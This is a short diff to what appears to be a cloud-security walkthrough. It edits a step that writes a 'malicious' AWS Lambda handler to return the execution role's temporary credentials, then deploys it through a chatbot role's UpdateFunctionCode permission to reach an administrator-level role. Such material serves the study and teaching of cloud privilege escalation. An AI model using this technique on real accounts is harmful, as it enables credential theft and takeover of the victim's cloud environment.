@@ -129,7 +129,7 @@ There it is: `AdministratorAccess`. The data processor Lambda has full account a
 Create a malicious Lambda handler. All it needs to do is read the environment variables that AWS automatically injects into every Lambda execution context (the execution role's temporary credentials) and return them in the response:
 
 ```bash
-cat > /tmp/malicious_lambda.js << 'EOF'
+cat > /tmp/index.js << 'EOF'
 'use strict';
 exports.handler = async () => ({
   statusCode: 200,
@@ -142,7 +142,7 @@ exports.handler = async () => ({
 });
 EOF
 
-cd /tmp && zip -q malicious_lambda.zip malicious_lambda.js
+cd /tmp && zip -q malicious_lambda.zip index.js
 ```
 
 Now deploy it to the data processor function using the chatbot role's `lambda:UpdateFunctionCode` permission:
